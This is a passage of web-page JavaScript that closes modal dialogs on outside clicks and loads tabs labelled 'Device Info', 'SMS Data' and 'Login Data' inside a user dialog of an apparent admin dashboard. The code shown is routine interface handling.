            }, 3000);
        }
        window.onclick = function(event) {
            const modals = document.querySelectorAll('.modal, .password-modal, .device-sms-modal');
            modals.forEach(modal => {
                if (event.target === modal) {
                    if (modal.id === 'userModal') {
                        closeUserModal();
                    } else if (modal.id === 'deviceSMSModal') {
                        closeDeviceSMSModal();
                    } else if (modal.id === 'passwordModal') {
                        cancelDelete();
                    } else {
                        modal.classList.add('hidden');
                    }
                }
            });
        }

        document.getElementById('userModal').addEventListener('click', function(e) {
            if (e.target.classList.contains('nav-btn') && e.target.closest('.tabs')) {
                const tabText = e.target.textContent.trim();
                let tabName;
                if (tabText.includes('Device Info')) tabName = 'deviceInfo';
                else if (tabText.includes('SMS Data')) tabName = 'smsData';
                else if (tabText.includes('Login Data')) tabName = 'loginData';
                
                if (tabName) {
                    loadTabContent(tabName);
                }
            }
        });